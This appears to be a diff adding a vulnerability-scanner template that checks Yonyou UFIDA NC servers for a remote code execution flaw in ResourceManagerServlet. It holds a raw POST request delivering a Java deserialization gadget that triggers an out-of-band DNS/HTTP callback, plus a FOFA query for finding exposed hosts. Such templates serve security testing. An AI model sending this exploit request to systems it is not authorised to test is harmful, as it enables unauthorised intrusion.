@@ -1,0 +1,39 @@
+id: yonyou-nc-ResourceManagerServlet-rce
+
+info:
+  name: 用友 UFIDA NC uap.framework.rc.controller.ResourceManagerServlet - rce
+  author: leadlife
+  severity: critical
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-qeury: icon_hash="1085941792" || app="用友-UFIDA-NC"
+  tags: yonyou,nc,rce,oa,oob
+
+
+http:
+  - raw:
+      - |
+        POST /servlet/~uapss/uap.framework.rc.controller.ResourceManagerServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
+        Connection: close
+        X-Forwarded-For: 127.0.0.10
+        X-Originating-IP: 127.0.0.10
+        X-Remote-Addr: 127.0.0.10
+        X-Remote-IP: 127.0.0.10
+        Accept-Encoding: gzip
+        SL-CE-SUID: 126
+        Content-Length: 35
+
+        {{generate_java_gadget("dns", "http://{{interactsh-url}}", "raw")}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
